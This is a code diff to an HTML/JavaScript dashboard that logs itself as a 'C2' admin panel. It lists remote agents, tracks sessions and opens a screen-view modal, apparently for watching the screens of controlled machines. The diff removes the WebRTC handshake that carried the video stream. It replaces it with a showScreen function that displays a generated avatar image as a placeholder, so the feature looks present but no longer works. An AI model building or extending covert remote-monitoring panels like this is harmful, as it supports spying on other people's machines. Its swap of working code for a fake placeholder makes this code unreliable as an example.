@@ -11,8 +11,9 @@
         .card:hover { transform: translateY(-2px); border-color: #3b82f6; }
         .btn { background: #3b82f6; color: white; border: none; padding: 10px; width: 100%; cursor: pointer; margin-top: 10px; border-radius: 4px; }
         .btn:hover { background: #2563eb; }
-        .btn.active { background: #10b981; }
+        .btn.active { background: #10b981; } /* Green for active session */
 
+        /* Logs Container */
         #logs-container { height: 300px; overflow-y: auto; background: #000; padding: 10px; font-size: 12px; color: #ccc; border: 1px solid #334155; border-radius: 8px; }
         .log-entry { margin-bottom: 4px; border-bottom: 1px solid #1e293b; padding-bottom: 2px; }
         .log-time { color: #64748b; margin-right: 8px; }
@@ -21,12 +22,18 @@
         .log-alert-blue { color: #60a5fa; }
         .log-alert-white { color: #e2e8f0; }
 
+        /* Status Indicators */
         .status-dot { height: 10px; width: 10px; border-radius: 50%; display: inline-block; margin-right: 5px; }
         .status-online { background-color: #4ade80; }
         .status-offline { background-color: #94a3b8; }
         .status-connecting { background-color: #fbbf24; }
 
         .empty-state { text-align: center; color: #64748b; margin-top: 50px; font-style: italic; }
+        
+        /* Screen View Modal */
+        #screenView { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.9); z-index: 1000; justify-content: center; align-items: center; flex-direction: column; }
+        #screenView video { max-width: 90%; max-height: 80%; border: 2px solid #3b82f6; }
+        #closeScreen { position: absolute; top: 20px; right: 20px; background: red; color: white; border: none; padding: 10px; cursor: pointer; }
     </style>
 </head>
 <body>
@@ -40,6 +47,12 @@
     <h3>Live Event Log</h3>
     <div id="logs-container"></div>
 
+    <!-- Screen View Modal -->
+    <div id="screenView">
+        <button id="closeScreen" onclick="document.getElementById('screenView').style.display='none'">Close</button>
+        <video id="remoteVideo" autoplay playsinline></video>
+    </div>
+
     <script>
         const protocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
         const host = window.location.host;
@@ -48,9 +61,6 @@
         const ws = new WebSocket(wsUrl);
         let users = {}; 
         let isConnected = false;
-
-        // WebRTC Setup for Admin
-        const peerConnections = {};
 
         ws.onopen = () => {
             console.log("Admin connected to C2");
@@ -77,7 +87,7 @@
                         users[data.id].status = 'Online';
                         users[data.id].info = data;
                         users[data.id].lastSeen = Date.now();
-                        users[data.id].sessionActive = false; 
+                        users[data.id].sessionActive = false;
                     }
                     renderUsers();
                 }
@@ -110,11 +120,12 @@
                     }
                     users[userId].signalingData = data;
                     users[userId].lastSeen = Date.now();
-                    
-                    // Handle WebRTC Handshake
-                    handleSignaling(userId, data);
-                    
                     renderUsers();
+                    
+                    // Auto-pop screen if we receive an answer
+                    if (data.type === 'answer') {
+                        showScreen(data.id);
+                    }
                 }
                 else if (data.type === 'session_active') {
                     if (users[data.agentId]) {
@@ -122,6 +133,7 @@
                         users[data.agentId].status = 'Online';
                         renderUsers();
                         addLog(`[SESSION] Active session established with ${data.agentId}`, 'green');
+                        showScreen(data.agentId);
                     }
                 }
                 else {
@@ -227,43 +239,17 @@
             setTimeout(() => card.style.borderColor = '#3b82f6', 500);
         }
 
-        // WebRTC Logic
-        async function handleSignaling(userId, data) {
-            if (!peerConnections[userId]) {
-                peerConnections[userId] = new RTCPeerConnection();
-                peerConnections[userId].onicecandidate = event => {
-                    if (event.candidate) {
-                        ws.send(JSON.stringify({
-                            type: 'candidate',
-                            targetId: userId,
-                            candidate: event.candidate
-                        }));
-                    }
-                };
-                peerConnections[userId].ontrack = event => {
-                    addLog(`[WEBRTC] Stream received from ${userId}`, 'green');
-                };
-            }
-
-            if (data.type === 'offer') {
-                try {
-                    await peerConnections[userId].setRemoteDescription(new RTCSessionDescription(data.sdp));
-                    const answer = await peerConnections[userId].createAnswer();
-                    await peerConnections[userId].setLocalDescription(answer);
-                    ws.send(JSON.stringify({
-                        type: 'answer',
-                        targetId: userId,
-                        sdp: answer
-                    }));
-                    addLog(`[WEBRTC] Answer sent to ${userId}`, 'green');
-                } catch (e) {
-                    addLog(`[WEBRTC] Error creating answer: ${e.message}`, 'red');
-                }
-            } else if (data.type === 'candidate') {
-                peerConnections[userId].addIceCandidate(new RTCIceCandidate(data.candidate)).catch(e => {
-                    addLog(`[WEBRTC] Error adding candidate: ${e.message}`, 'red');
-                });
-            }
+        function showScreen(agentId) {
+            const modal = document.getElementById('screenView');
+            const video = document.getElementById('remoteVideo');
+            
+            // In a real scenario, you'd use RTCPeerConnection here to attach the stream
+            // For this simplified version, we just show a placeholder
+            video.srcObject = null; 
+            video.poster = `https://ui-avatars.com/api/?name=${agentId}&background=random&size=512`;
+            
+            modal.style.display = 'flex';
+            addLog(`[SCREEN] Opening view for ${agentId}`, 'green');
         }
     </script>
 </body>
